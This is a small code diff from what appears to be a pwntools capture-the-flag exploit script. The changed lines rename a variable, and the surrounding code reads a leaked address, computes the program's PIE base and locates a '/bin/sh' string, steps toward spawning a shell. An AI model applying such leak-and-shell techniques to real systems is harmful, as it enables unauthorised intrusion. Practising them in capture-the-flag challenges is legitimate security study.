@@ -6,9 +6,9 @@ p.sendlineafter("Welcome, what is your name?\n","a"*31+"b")
 
 p.sendlineafter("> ","2")
 p.recvuntil("ab")
-number = u64(p.recv(6)+"\x00"*2)
-log.info("number: " + hex(number))
-pie = number - 0x2024
+leak = u64(p.recv(6)+"\x00"*2)
+log.info("leak: " + hex(leak))
+pie = leak - 0x2024
 log.info("pie: " + hex(pie))
 bin_sh = pie + 0x20a3
 log.info("bin_sh: "+hex(bin_sh))
